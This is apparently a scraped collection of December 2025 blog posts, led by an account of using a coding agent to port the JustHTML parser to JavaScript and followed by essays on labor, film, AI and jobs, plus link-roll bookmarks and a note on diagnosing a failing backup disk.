<p><code>We are going to create a JavaScript port of ~/dev/justhtml - an HTML parsing library that passes the full ~/dev/html5lib-tests test suite. It is going to have a similar API to the Python library but in JavaScript. It will have no dependencies other than raw JavaScript, hence it will work great in the browser and node.js and other environments. Start by reading ~/dev/justhtml and designing the user-facing API for the new library - create a spec.md containing your plan.</code></p>
</blockquote>
<p>I reviewed the spec, which included a set of proposed milestones, and told it to add another:</p>
<blockquote>
<p><code>Add an early step to the roadmap that involves an initial version that parses a simple example document that is valid and returns the right results. Then add and commit the spec.md file.</code></p>
</blockquote>
<p>Here's <a href="https://github.com/simonw/justjshtml/blob/19b8eb1f2ca80f428a3c40862d5ec05d36e5166b/spec.md">the resulting spec.md file</a>. My request for that initial version became &quot;Milestone 0.5&quot; which looked like this:</p>
<blockquote>
<p><strong>Milestone 0.5 — End-to-end smoke parse (single valid document)</strong></p>
<ul>
<li>Implement the smallest end-to-end slice so the public API is real early:
<ul>
<li><code>new JustHTML(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)</code> returns a tree with the expected tag structure and text nodes.</li>
<li><code>doc.toText()</code> returns <code>&quot;Hello&quot;</code> and <code>doc.errors</code> is empty for this valid input.</li>
</ul>
</li>
<li>Add <code>scripts/smoke.js</code> (no deps) that runs the example and asserts the expected structure/output.</li>
<li>Gate: <code>node scripts/smoke.js</code> passes.</li>
</ul>
</blockquote>
<p>Then I told it:</p>
<blockquote>
<p><code>Implement Milestone 0.5</code></p>
</blockquote>
<p>And off it went. The resulting code appeared to work so I said:</p>
<blockquote>
<p><code>Configure GitHub Actions test.yml to run that on every commit, then commit and push</code></p>
</blockquote>
<p>I ran <code>git init</code> and created a private GitHub repository for this project at this point, and set up the local directory to push to that remote.</p>
<p>Here's <a href="https://github.com/simonw/justjshtml/commit/48497cbd05584c88af757a0736a2ee447468b6b3">that initial push</a>. Then I told it:</p>
<blockquote>
<p><code>OK do the rest, commit and push often</code></p>
</blockquote>
<p>And that was almost it!</p>
<p>I set my laptop to not fall asleep and left it to its devices while we went off to buy a Christmas tree. The &quot;commit and push often&quot; meant I could monitor its progress on my phone by refreshing <a href="https://github.com/simonw/justjshtml/commits/main">the commit log on GitHub</a>.</p>
<p>I was running this against my $20/month ChatGPT Plus account, which has a five hour token allowance window for Codex CLI. That ran out at 6:35pm and Codex paused, so I waited until the reset point at 7:14pm and typed:</p>
<blockquote>
<p><code>Keep going</code></p>
</blockquote>
<p>At 9:30pm it declared itself done with the following summary message:</p>
<pre><code>• What’s Done

  - html5lib-tests now run in CI and pass: tokenizer 6810/6810, tree 1770/1782
    (12 skipped: #script-on), serializer 230/230, encoding 82/83 (1 skipped:
    scripted) (.github/workflows/test.yml:1).
  - Public API expanded: stream() (src/stream.js:1), CSS selectors query()/
    matches() (src/selector.js:1), and toMarkdown() (src/markdown.js:1), all
    exported via src/index.js:1.
  - Added no-deps unit scripts for selectors/stream/markdown (scripts/run-
    selector-tests.js:1, scripts/run-stream-tests.js:1, scripts/run-markdown-
    tests.js:1) and wired them into CI.
  - Fixed TreeBuilder so &lt;br&gt; no longer closes &lt;p&gt; (src/treebuilder.js:647).

</code></pre>
<p>As a finishing touch, I had it add a playground interface so I could try out the new library in my browser. I prompted:</p>
<blockquote>
<p><code>Add a playground.html in the top level folder which loads the necessary ES modules from ./src/... and implements the exact same functionality as seen on https://tools.simonwillison.net/justhtml but using the JavaScript library instead of Pyodide</code></p>
</blockquote>
<p>It fetched my <a href="https://tools.simonwillison.net/justhtml">existing JustHTML playground page</a> ( <a href="https://simonwillison.net/2025/Dec/14/justhtml/#first-impressions-of-justhtml">described here</a>) using <code>curl</code> and built a new <code>playground.html</code> file that loaded the new JavaScript code instead. This worked <em>perfectly</em>.</p>
<p>I enabled GitHub Pages for my still-private repo which meant I could access the new playground at this URL:</p>
<p><a href="https://simonw.github.io/justjshtml/playground.html">https://simonw.github.io/justjshtml/playground.html</a></p>
<p><img src="https://static.simonwillison.net/static/2025/justjshtml-playground.jpg" alt="Screenshot of JustJSHTML Playground web application. Header reads &quot;JustJSHTML Playground&quot; with subtitle &quot;A dependency-free JavaScript HTML5 parser - GitHub&quot;. Below is a status bar showing &quot;JavaScript Environment&quot; with a green &quot;Ready&quot; badge. The main input area has &quot;Paste HTML&quot; and &quot;Fetch from URL&quot; buttons, with a text area containing HTML code: &quot;   Example Page     &quot;. A &quot;Playground Mode&quot; section shows buttons for &quot;CSS Selector Query&quot;, &quot;Pretty Print HTML&quot;, &quot;Tree Structure&quot;, &quot;Stream Events&quot;, &quot;Extract Text&quot;, and &quot;To Markdown&quot; (highlighted in purple). Below is a text field labeled &quot;CSS Selector (optional - leave empty for whole document):&quot; with placeholder &quot;e.g., article, main, .content (or leave empty)&quot; and a green &quot;Convert to Markdown&quot; button. The Output section has a teal header with &quot;Whole document&quot; badge and displays converted markdown: &quot;Example Page&quot; followed by &quot;- Home&quot; &quot;- About&quot; &quot;- Contact&quot;."></p>
<p>All it needed now was some documentation:</p>
<blockquote>
<p><code>Add a comprehensive README with full usage instructions including attribution plus how this was built plus how to use in in HTML plus how to use it in Node.js</code></p>
</blockquote>
<p>You can <a href="https://github.com/simonw/justjshtml/blob/f3a33fdb29bf97846fd017185edc8cf82783032e/README.md">read the result here</a>.</p>
<p>We are now at eight prompts total, running for just over four hours and I've decorated for Christmas and watched <a href="https://en.wikipedia.org/wiki/Wake_Up_Dead_Man">Wake Up Dead Man</a> on Netflix.</p>
<p>According to Codex CLI:</p>
<blockquote>
<p><code>Token usage: total=2,089,858 input=1,464,295 (+ 97,122,176 cached) output=625,563 (reasoning 437,010)</code></p>
</blockquote>
<p>My <a href="https://www.llm-prices.com/#it=2089858&amp;cit=97122176&amp;ot=625563&amp;sel=gpt-5.2">llm-prices.com calculator</a> estimates that at <span class="math inline">\(29.41 if I was paying for those tokens at API prices, but they were included in my \)</span>20/month ChatGPT Plus subscription so the actual extra cost to me was zero.</p>
<h4>What can we learn from this?</h4>
<p>I'm sharing this project because I think it demonstrates a bunch of interesting things about the state of LLMs in December 2025.</p>
<ul>
<li>Frontier LLMs really can perform complex, multi-hour tasks with hundreds of tool calls and minimal supervision. I used GPT-5.2 for this but I have no reason to believe that Claude Opus 4.5 or Gemini 3 Pro would not be able to achieve the same thing - the only reason I haven't tried is that I don't want to burn another 4 hours of time and several million tokens on more runs.</li>
<li>If you can reduce a problem to a robust test suite you can set a coding agent loop loose on it with a high degree of confidence that it will eventually succeed. I called this <a href="https://simonwillison.net/2025/Sep/30/designing-agentic-loops/">designing the agentic loop</a> a few months ago. I think it's the key skill to unlocking the potential of LLMs for complex tasks.</li>
<li>Porting entire open source libraries from one language to another via a coding agent works extremely well.</li>
<li>Code is so cheap it's practically free. Code that <em>works</em> continues to carry a cost, but that cost has plummeted now that coding agents can check their work as they go.</li>
<li>We haven't even <em>begun</em> to unpack the etiquette and ethics around this style of development. Is it responsible and appropriate to churn out a direct port of a library like this in a few hours while watching a movie? What would it take for code built like this to be trusted in production?</li>
</ul>
<p>I'll end with some open questions:</p>
<ul>
<li>Does this library represent a legal violation of copyright of either the Rust library or the Python one?</li>
<li>Even if this is legal, is it ethical to build a library in this way?</li>
<li>Does this format of development hurt the open source ecosystem?</li>
<li>Can I even assert copyright over this, given how much of the work was produced by the LLM?</li>
<li>Is it responsible to publish software libraries built in this way?</li>
<li>How much better would this library be if an expert team hand crafted it over the course of several months?</li>
</ul>

      <p><img src="https://imgs.scripting.com/2025/12/15/reiner.png" alt="">For some reason, I'm hit especially hard by the death of <a href="https://en.wikipedia.org/wiki/Rob_Reiner">Rob Reiner</a>. And it's coming at a time when I understand a lot more about how movie directors work, having watched the fantastic <a href="https://www.metacritic.com/tv/mr-scorsese/">Mr Scorsese</a> 5-part <a href="https://en.wikipedia.org/wiki/Mr._Scorsese">documentary</a> <a href="https://www.metacritic.com/tv/mr-scorsese/">series</a> on Apple TV. The movie director can be as involved in the story as much as the writers or actors. There was a story about Reiner, I heard today in eulogy: he was dating his future wife at the same time he was directing the fantastic <a href="https://www.metacritic.com/movie/when-harry-met-sally/">When Harry Met Sally</a>. He changed the ending because he was in love, and thus created the most heart-pulling <a href="https://www.youtube.com/watch?v=Q9JSVGS4dHU">end to a story</a>, when the two friends realize they should be together, and Billy Crystal's character gives the great closing speech that contains this line, that pretty well sums up the urgency of love: &quot;When you realize you want to spend the rest of your life with somebody, you want the rest of your life to start as soon as possible.&quot; The Scorsese doc opens up the art of making movies for me in the same way the <a href="https://en.wikipedia.org/wiki/Peter_Jackson">Peter Jackson</a> <a href="https://en.wikipedia.org/wiki/The_Beatles:_Get_Back">documentary</a> on the <a href="http://scripting.com/2022/01/25/144824.html?title=imABeatleshead">Beatles</a> showed us how super creative music creators do their work. And the timing is great, because it says so much about Reiner's accomplishments and gifts.</p>

(date: 2025-12-15)
      <p>
      <p>Daveverse has become a serious site, and I'm more reluctant to use it for a test post than I ever have been, but here I am once again doing a test post. I have high hopes for this test. And my sleeves are rolled up, I'm reasonably caffeinated, and ready to rock. Or roll.</p>
<p>Maybe I'll write some stuff here that I will later post to Scripting News, when it will come right back here to daveverse. As they say -- Oh the humanity.</p>
<p>BTW the trailer for Animal Farm was realllly offensive, as if it were a cautionary tale. It looks like a kids show, but it's not, but people will still have their kids watch it, they won't know and &quot;A cautionary tale&quot; kind of says the problem out loud. It's bullshit because we're living Animal Farm right now. So if you want your kid to be aware of reality, the <em>cautionary tale</em> part is a problem.</p>
<p>BTW when I first wrote this, I wrote Animal House not Animal Farm. Very different movies.</p>
<p>Also the Scorcese special is full of information about how movies work, but barely skims the surface. Watching it was like watching the Peter Jackson Beatles story. All of a sudden I get a glimpse of how they do it, how people work with each other. Scorcese formed a kind of Beatles of his own. And there are a lot of his movies I haven't seen.</p>
<p>NakedJen if you read this -- can we find a way to get four great Scorcese movies I haven't seen into the rotation? And btw, when I typed NJ's name in just now, I wrote NakeDen. Too much ChatGPT I expect.</p>
<p>WordLand bug report: if you don't specify a site, when you publish it goes to the last site you posted to which is likely links.daveverse.org.</p>

      <h1>Pluralistic: Break up bad companies; replace bad union bosses (15 Dec 2025)</h1>

(date: 2025-12-15)
      <p>
      <p>Today's links Break up bad companies; replace bad union bosses: Labor should be fixed, capital should be vanquished. Hey look at this: Delights to delectate. Object permanence: &quot;Star Island&quot;; &quot;Mediactive&quot;; Afraid of solar; Well-Armed Peasants; Dumpster fire exits; Wikipedia v Brittanica; Pentagon v Quakers; Stealing whole houses; &quot;Situation Normal.&quot; Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Break up bad companies; replace bad union bosses (permalink) Unions are not perfect. Indeed, it is possible to belong to a union that is bad for workers: either because it is weak, or corrupt, or captured (or some combination of the three). Take the &quot;two-tier contract.&quot; As unions lost ground – thanks to changes in labor law enforcement under a succession of both Republican and Democratic administrations – labor bosses hit on a suicidal strategy for contract negotiations. Rather than bargaining for a single contract that covered all the union's dues-paying members, these bosses negotiated contracts that guaranteed benefits for existing members, but did not extend these benefits to new members: <a href="https://pluralistic.net/2021/11/25/strikesgiving/#shed-a-tier">https://pluralistic.net/2021/11/25/strikesgiving/#shed-a-tier</a> A two-tier contract is one where all workers pay dues, but only the dwindling rump of older, more established workers get any protection or representation from their union. An ever-larger portion of the membership have to pay dues, but get nothing for them. You couldn't come up with a better way to destroy unions if you tried. Thankfully, union workers figured out that the answer to this problem was firing their leaders and replacing them with militant, principled leaders who cared about workers, not just a subsection of their members. Radicals in big unions – like the UAW – teamed up with comrades from university grad students' unions to master the arcane rules that had been weaponized by corrupt bosses to prevent free and fair union elections. Together, they forced the first legitimate union elections in generations, and then the newly elected leaders ran historic strikes that won huge gains for workers (and killed off the two-tier contract): <a href="https://theintercept.com/2023/04/07/deconstructed-union-dhl-teamsters-uaw/">https://theintercept.com/2023/04/07/deconstructed-union-dhl-teamsters-uaw/</a> Corrupt unions aren't the only life-destroying institutions that radicals have set their sights on this decade. Concentrated corporate power is the most dangerous force in the world today (indeed, it's large, powerful corporations that corrupted those unions). Antitrust activists, environmental activists, consumer rights activists, privacy activists and labor activists have stepped up the global war on big business all through this decade. From new antitrust laws to antitrust lawsuits to strikes to boycotts to mass protests and direct action, this decade has marked a turning point in the global consciousness about the danger of corporate power and the need to fight it. But there's a big, important difference between bad corporations and bad unions: what we should do about them. The answer to a powerful, corrupt corporation is to take action that strips it of its power: break the company up, whack it with fines, take away its corporate charter, strip its executives of their fortunes, even put them in prison. That's because corporations are foundationally undemocratic institutions, governed by &quot;one share, one vote&quot; (and the billionaires who benefit from corporate power are building a society that's &quot;one dollar, one vote&quot;). They fundamentally exist to consolidate power at the expense of workers, suppliers and customers, to extract wealth by imposing costs on the rest of us, from pollution to political corruption. When a corporation gets big enough to pose a risk to societal wellbeing, we need to smash that corporation, not reform it. But the answer to a corrupt union is to fire the union bosses and replace them with better ones. The mission of a union is foundationally pro-democratic. A unionized workplace is a democratic workplace. As in any democracy, workplace democracies can be led by bad or incompetent people. But, as with any democracy, the way you fix this is by swapping out the bad leaders for good ones – not by abolishing democracy and replacing it with an atomized society in which it's every worker for themself, bargaining with a boss who will always win a one-on-one fight in the long run. I raise this because a general strike is back on the table, likely for May Day 2028 (5/1/28): <a href="https://labornotes.org/2025/12/maybe-general-strike-isnt-so-impossible-now">https://labornotes.org/2025/12/maybe-general-strike-isnt-so-impossible-now</a> Unions are an important check against fascism. That's why fascists always start by attacking organized labor: solidarity is the opposite of fascism. To have unions that are fit for purpose in this existential battle for the future of the nation – and, quite possibly, the human race – we desperately need better leaders. Like the union bosses who gave us the two-tier contract, many of our union leaders see their mission as narrowly serving their existing members, and not other workers – not even workers who might some day become their members. To get a sense of how bad it's gotten, consider these five facts: I. Public support for unions is at its highest level since the Carter administration; II. More workers want to join unions than at any time in living memory; III. Unions have larger cash reserves than at any time in history; IV. Under Biden, the National Labor Relations Board was more friendly to unions than at any time in generations; and V. During the Biden years, the number of unionized workers in America went down, not up. That's because union bosses – sitting on a mountain of cash, surrounded by workers begging to be organized – decided that their priority was their existing members, and declined to spend more than a pittance of their cash reserves on organizing efforts. This is suicidal – as self-destructive as the two-tier contract was. To pull off a general strike, we will need mass civil disobedience, and a willingness to ignore the Taft-Hartley Act's ban on solidarity strikes. Trump's NLRB isn't just hostile to workers – he's illegally fired so many of its commissioners that they can't even perform most of their functions. But a militant labor movement could turn that to its advantage, because militants know that when Trump fires the refs, you don't have to stop the game – you can throw out the rule book: <a href="https://pluralistic.net/2025/01/29/which-side-are-you-on-2/#strike-three-yer-out">https://pluralistic.net/2025/01/29/which-side-are-you-on-2/#strike-three-yer-out</a> This is the historic opportunity and challenge before us – to occupy our unions, save our workplace democracies, and then save our national democracy itself.

      <p>The Model Context Protocol (MCP) is genuinely useful. It gives people who develop AI tools a standardized way to call functions and access data from external systems. Instead of building custom integrations for each data source, you can expose databases, APIs, and internal tools through a common protocol that any AI can understand. However, I’ve […]</p>

      <p>Cast your mind back to May of this year: Congress was in the throes of debate over the massive <a href="https://www.congress.gov/bill/119th-congress/house-bill/1">budget bill</a>. Amidst the many seismic provisions, Senator Ted Cruz <a href="https://iapp.org/news/a/policy-analysis-us-house-committee-seeks-moratorium-on-state-AI-rules">dropped</a> a ticking time bomb of tech policy: a ten-year moratorium on the ability of states to regulate artificial intelligence.

      <p>Digital works cannot have traditional aura Walter Benjamin observes that original artworks have a quality which is lost in mechanical reproduction, an ‘aura’ that reflects their history, context, and passage through the world. “The presence of the original is the prerequisite to the concept of authenticity,” writes Benjamin. In this framing, an artwork’s authenticity comes […]</p>

      <h1>It’s Uncomfortable To Sit With “I Don’t Know”</h1>

(date: 2025-12-14)
      <p>
      <p><a href="https://chriscoyier.net/2025/12/04/the-jeopardy-phenomenon/">Chris Coyier</a>:</p>
<blockquote>
<p>There’s the thing where if you’re reading an article in the newspaper, and it’s about stuff you don’t know a ton about, it all seems well and good. Then you read another article in the same paper and it’s about something you know intimately (your job, your neighborhood, your hobby, etc) there is a good chance you’ll be like hey! that’s not quite right!</p>
</blockquote>
<p>Chris extends this idea to AI-generated code, i.e. if you don’t know or understand the generated code you probably think, “Looks good to me!” But if you do know it you probably think, “Wait a second, that’s not quite right.”</p>
<p><a href="https://adactio.com/links/22289">Here’s Jeremy Keith riffing on Chris’ thoughts</a>:</p>
<blockquote>
<p>I’m astounded by the cognitive dissonance displayed by people who say “I asked an LLM about {topic I’m familiar with}, and here’s all the things it got wrong” who then proceed to say “It was really useful when I asked an LLM for advice on {topic I’m not familiar with, hence why I’m asking an LLM for advice}.”</p>
</blockquote>
<p>Kind of feels like this boils down to: How do we know what we know?</p>
<p>To be fair, that’s a question I’ve wrestled with my whole life.</p>
<p>And the older I get, the more and more I realize how often we barely know anything.</p>
<p>There’s a veneer of surety everywhere in the world.</p>
<p>There are industries of people and services who will take your money in exchange for a sense of surety — influencers, consultants, grifters, AI, they all exist because we are more than willing to pay with our time, attention, and money to feel like we “know” something.</p>
<p>“You’re absolutely right!”</p>
<p>But I, for one, often feel increasingly unsure of everything I thought I knew.</p>
<p>For example: I can’t count the number of times I thought I understood a piece of history, only to later find out that the commonly-accepted belief comes to use from a single source, written decades later in a diary or on a piece of parchment or on a stone, by someone with blind spots, questionable incentives, or a flair for the dramatic, all of which leaves me seriously questioning the veracity and objectivity of something I thought I knew.</p>
<p>Which leads me to the next, uncomfortable question: How many other things are there that <em>I thought</em> I knew but are full of uncertainty just like this?</p>
<p>All surety vanishes.</p>
<p>And that’s an uncomfortable place to be. Who wants to admit “I don’t know”?</p>
<p>It’s so easy to take what’s convenient over what corresponds to reality.</p>
<p>And that’s what scares me about AI.</p>

      <p>When I write, I like to write using a plain text editor. It is the closest experience I have to a mechanical typewriter that is easily editable. I don't care for cut and paste.

      <p>If you write software that software produces web pages. That software should be producing RSS 2.0. Better yet, accept RSS 2.0 as an input. Now you're social.</p>

      <h1>JustHTML is a fascinating example of vibe engineering in action</h1>

(date: 2025-12-14)
      <p>
      <p>I recently came across <a href="https://github.com/EmilStenstrom/justhtml">JustHTML</a>, a new Python library for parsing HTML released by Emil Stenström. It's a very interesting piece of software, both as a useful library and as a case study in sophisticated AI-assisted programming.</p>
<h4>First impressions of JustHTML</h4>
<p>I didn't initially know that JustHTML had been written with AI assistance at all. The README caught my eye due to some attractive characteristics:</p>
<ul>
<li>It's pure Python. I like libraries that are pure Python (no C extensions or similar) because it makes them easy to use in less conventional Python environments, including Pyodide.</li>
<li>&quot;Passes all 9,200+ tests in the official <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> suite (used by browser vendors)&quot; - this instantly caught my attention! HTML5 is a big, complicated but meticulously written specification.</li>
<li>100% test coverage. That's not something you see every day.</li>
<li>CSS selector queries as a feature. I built a Python library for this <a href="https://github.com/simonw/soupselect">many years ago</a> and I'm always interested in seeing new implementations of that pattern.</li>
<li>html5lib has been <a href="https://github.com/mozilla/bleach/issues/698">inconsistently maintained</a> over the last few years, leaving me interested in potential alternatives.</li>
<li>It's only 3,000 lines of implementation code (and another ~11,000 of tests.)</li>
</ul>
<p>I was out and about without a laptop so I decided to put JustHTML through its paces on my phone. I <a href="https://github.com/simonw/tools/pull/156#issue-3726212220">prompted Claude Code for web</a> on my phone and had it build <a href="https://tools.simonwillison.net/justhtml">this Pyodide-powered HTML tool</a> for trying it out:</p>
<p><img src="https://static.simonwillison.net/static/2025/justhtml.jpeg" alt="Screenshot of a web app interface titled &quot;Playground Mode&quot; with buttons labeled &quot;CSS Selector Query&quot; (purple, selected), &quot;Pretty Print HTML&quot;, &quot;Tree Structure&quot;, &quot;Stream Events&quot;, &quot;Extract Text&quot;, and &quot;To Markdown&quot; (all gray). Below is a text field labeled &quot;CSS Selector:&quot; containing &quot;p&quot; and a green &quot;Run Query&quot; button. An &quot;Output&quot; section with dark background shows 3 matches in a green badge and displays HTML code"></p>
<p>This was enough for me to convince myself that the core functionality worked as advertised. It's a neat piece of code!</p>
<h4>Turns out it was almost all built by LLMs</h4>
<p>At this point I went looking for some more background information on the library and found Emil's blog entry about it: <a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/">How I wrote JustHTML using coding agents</a>:</p>
<blockquote>
<p>Writing a full HTML5 parser is not a short one-shot problem. I have been working on this project for a couple of months on off-hours.</p>
<p>Tooling: I used plain VS Code with Github Copilot in Agent mode. I enabled automatic approval of all commands, and then added a blacklist of commands that I always wanted to approve manually. I wrote an <a href="https://github.com/EmilStenstrom/justhtml/blob/main/.github/copilot-instructions.md">agent instruction</a> that told it to keep working, and don't stop to ask questions. Worked well!</p>
</blockquote>
<p>Emil used several different models - an advantage of working in VS Code Agent mode rather than a provider-locked coding agent like Claude Code or Codex CLI. Claude Sonnet 3.7, Gemini 3 Pro and Claude Opus all get a mention.</p>
<h4>Vibe engineering, not vibe coding</h4>
<p>What's most interesting about Emil's 17 step account covering those several months of work is how much software engineering was involved, independent of typing out the actual code.</p>
<p>I wrote about <a href="https://simonwillison.net/2025/Oct/7/vibe-engineering/">vibe engineering</a> a while ago as an alternative to vibe coding.</p>
<p>Vibe coding is when you have an LLM knock out code without any semblance of code review - great for prototypes and toy projects, definitely not an approach to use for serious libraries or production code.</p>
<p>I proposed &quot;vibe engineering&quot; as the grown up version of vibe coding, where expert programmers use coding agents in a professional and responsible way to produce high quality, reliable results.</p>
<p>You should absolutely read <a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/#the-journey">Emil's account</a> in full. A few highlights:</p>
<ol>
<li>He hooked in the 9,200 test <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> conformance suite almost from the start. There's no better way to construct a new HTML5 parser than using the test suite that the browsers themselves use.</li>
<li>He picked the core API design himself - a TagHandler base class with handle_start() etc. methods - and told the model to implement that.</li>
<li>He added a comparative benchmark to track performance compared to existing libraries like html5lib, then experimented with a Rust optimization based on those initial numbers.</li>
<li>He threw the original code away and started from scratch as a rough port of Servo's excellent <a href="https://github.com/servo/html5ever">html5ever</a> Rust library.</li>
<li>He built a custom profiler and new benchmark and let Gemini 3 Pro loose on it, finally achieving micro-optimizations to beat the existing Pure Python libraries.</li>
<li>He used coverage to identify and remove unnecessary code.</li>
<li>He had his agent build a <a href="https://github.com/EmilStenstrom/justhtml/blob/main/benchmarks/fuzz.py">custom fuzzer</a> to generate vast numbers of invalid HTML documents and harden the parser against them.</li>
</ol>
<p>This represents a lot of sophisticated development practices, tapping into Emil's deep experience as a software engineer. As described, this feels to me more like a lead architect role than a hands-on coder.</p>
<p>It perfectly fits what I was thinking about when I described <strong>vibe engineering</strong>.</p>
<p>Setting the coding agent up with the html5lib-tests suite is also a great example of <a href="https://simonwillison.net/2025/Sep/30/designing-agentic-loops/">designing an agentic loop</a>.</p>
<h4>&quot;The agent did the typing&quot;</h4>
<p>Emil concluded his article like this:</p>
<blockquote>
<p>JustHTML is about 3,000 lines of Python with 8,500+ tests passing. I couldn't have written it this quickly without the agent.</p>
<p>But &quot;quickly&quot; doesn't mean &quot;without thinking.&quot; I spent a lot of time reviewing code, making design decisions, and steering the agent in the right direction. The agent did the typing; I did the thinking.</p>
<p>That's probably the right division of labor.</p>
</blockquote>
<p>I couldn't agree more. Coding agents replace the part of my job that involves typing the code into a computer. I find what's left to be a much more valuable use of my time.</p>

      <h1>Copywriters reveal how AI has decimated their industry</h1>

(date: 2025-12-14)
      <p>
      <p><strong><a href="https://www.bloodinthemachine.com/p/i-was-forced-to-use-ai-until-the">Copywriters reveal how AI has decimated their industry</a></strong></p>
<p>Brian Merchant has been collecting personal stories for his series <a href="https://www.bloodinthemachine.com/s/ai-killed-my-job">AI Killed My Job</a> - previously covering <a href="https://www.bloodinthemachine.com/p/how-ai-is-killing-jobs-in-the-tech-f39">tech workers</a>, <a href="https://www.bloodinthemachine.com/p/ai-killed-my-job-translators">translators</a>, and <a href="https://www.bloodinthemachine.com/p/artists-are-losing-work-wages-and">artists</a> - and this latest piece includes anecdotes from 12 professional copywriters all of whom have had their careers devastated by the rise of AI-generated copywriting tools.</p>
<p>It's a tough read. Freelance copywriting does not look like a great place to be right now.</p>
<blockquote>
<p>AI is really dehumanizing, and I am still working through issues of self-worth as a result of this experience. When you go from knowing you are valuable and valued, with all the hope in the world of a full career and the ability to provide other people with jobs... To being relegated to someone who edits AI drafts of copy at a steep discount because “most of the work is already done” ...</p>
</blockquote>
<p>The big question for me is if a new AI-infested economy creates new jobs that are a great fit for people affected by this. I would hope that clear written communication skills are made even more valuable, but the people interviewed here don't appear to be finding that to be the case.</p>

time for a recap.</p>
<p>The list remains short, though the headings are broad. I speak to many
entrepreneurs and business operators and ask myself whether their

not. That says to me that they will be overtaken by AI developments.
Maybe they will last 12 or 18 months, but it won’t be long.</p>

sometimes say “a data center full of GPUs is like a warehouse full of
bananas, that’s got a relatively short half life in terms of its
usefulness.” That’s important to keep in mind. That’s what makes it
different from prior CapEx spending. Moments like railroads, canals,
rural electrification, take your pick, because of the nature of the
perished ability of the thing that we’re investing in.</p>

<p>Common Lisp is old, and its inspiration is even older. It was developed
when there was zero consensus on how file systems worked, operating

age shows. It pinned down terminology way before other languages got to
the same point, and, as it happens so often, the late arrivals decided
that they needed different words and these words stuck</p>

<h2>🔖 <a href="https://daily.bandcamp.com/best-of-2025/the-best-experimental-music-of-2025">The Best Experimental Music of 2025</a></h2>
<p>Welcome to the year-end edition of Best Experimental Music on Bandcamp,
in which we’ve picked 12 of our favorites from 2025. Once again, all
kinds of amazing experimental music appeared on Bandcamp this year, and
it was our immense pleasure to listen to as much of it as we could, and
pass our favorites along to you. There were hundreds of releases that
could’ve made this list, but we trust that whatever the style, whomever
the artist, and whatever the story behind their music is, you’ll find
something to love. Presented in alphabetical order by artist, our
selections include avant-rock, longform drone, vocal explorations, and
cello narratives.</p>
<h2>🔖 <a href="https://arxiv.org/abs/2509.07043">ModellingScenarios for Carbon-aware Geographic Load Shifting of Compute Workloads</a></h2>
<p>We present an analytical model to evaluate the reductions in emissions
resulting from geographic load shifting. This model is optimistic as it
ignores issues of grid capacity, demand and curtailment. In other words,
real-world reductions will be smaller than the estimates. However, even
with these assumptions, the presented scenarios show that the realistic
reductions from carbon-aware geographic load shifting are small, of the
order of 5%. This is not enough to compensate the growth in emissions
from global data centre expansion.</p>
<h2>🔖 <a href="https://ottolenghi.co.uk/pages/recipes/braised-chickpeas-with-carrots-dates-and-feta">Braised chickpeas with carrots, dates and feta</a></h2>
<p>Serve with rice or flatbreads for a vegetarian main course; leave out
the feta for a vegan version. Soaking the chickpeas is necessary to
achieve the right degree of cooking, so don’t be tempted to skip this
stage.</p>
<h2>🔖 <a href="https://organizingmythoughts.org/you-cant-fight-fascism-while-defunding-libraries/">You Can’t Fight Fascism While Defunding Libraries</a></h2>
<p>We are living through a coordinated assault on knowledge. In a moment
when Big Tech is waging war on complex thought, a fascist government is
targeting higher education, and the media landscape is being demolished
by the same oligarchs driving this era of smash-and-grab politics,
libraries are under-appreciated outposts of struggle, sharing and
survival. They are sites of refuge, where curiosity is nurtured, where
people find shelter, education, entertainment, job assistance,
skill-building programs, and access to resources that would otherwise be
out of reach. “We do it all at the library,” Sara Heymann, a library
associate in the Chicago Public Library (CPL) system, recently told me.
“We do a lot of arts, science, and literacy programming. We host movie
nights. We have programs for helping people with their taxes, small
businesses, and mental health. We help people.”</p>

<p>The answer is that it is <code>/dev/sdb1</code> and that’s the backup disk. Well, that’s better than the laptop disk!</p>
<p>The disk is so old it doesn’t support <code>smartmon</code>, I think.</p>
<p>So, let’s unmount and check it:</p>
<pre><code>sudo umount /dev/sdb1
sudo fsck /dev/sdb1

</code></pre>
<p>The result of that was a single note:</p>
<pre><code>fsck from util-linux 2.41

</code></pre>
<p>Now I’m going to try and find the bad blocks and mark them:</p>
<pre><code>sudo badblocks -sv /dev/sdb

</code></pre>
<p>This is going to take a long time.</p>
<p>The last time this happened to me was <a href="2006-07-09_Bad_Blocks_on_an_External_Drive">20 years ago</a>.</p>
<p>In the mean time, I found that old 1 TB hard disk I still had lying around, formatted it, created an ext4 filesystem on it, went back to <a href="2025-01-31-backup">my old instructions</a> and added its ID to the backup disks, setup a new Borg repository and started a run.</p>
<p>I think think I need to buy a new backup disk.</p>

      <h1>Pluralistic: Federal Wallet Inspectors (13 Dec 2025)</h1>

(date: 2025-12-13)
      <p>
      <p>Today's links Federal Wallet Inspectors: Does tech *really* move too fast to regulate? Hey look at this: Delights to delectate. Object permanence: Soda can Van de Graff; Amazon rents a copy of the web; Boardgame Remix Kit; No furniture photos please we're British; Youtube vs fair use; Carbon offsets are bullshit; Arkham model railroad; Happy Birthday is in the public domain; Ted Cruz hires Cambridge Analytica; The kid who wanted to join the NSA; Daddy Daughter Xmas Podcast 2020. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Federal Wallet Inspectors (permalink) Look, I'm not trying to say that new technologies never raise gnarly new legal questions, but what I am saying is that a lot of the time, the &quot;new legal challenges&quot; raised by technology are somewhere between 95% to 100% bullshit, ginned up by none-too-bright tech bros and their investors, and then swallowed by regulators and lawmakers who are either so credulous they'd lose a game of peek-a-boo, or (likely) in on the scam. Take &quot;fintech.&quot; As Trashfuture's Riley Quinn is fond of saying, &quot;when you hear 'fintech,' think 'unregulated bank'&quot;: <a href="https://pluralistic.net/2022/03/02/shadow-banking-2-point-oh/#leverage">https://pluralistic.net/2022/03/02/shadow-banking-2-point-oh/#leverage</a> I mean, the whole history of banking is: &quot;Bankers think of a way to do reckless things 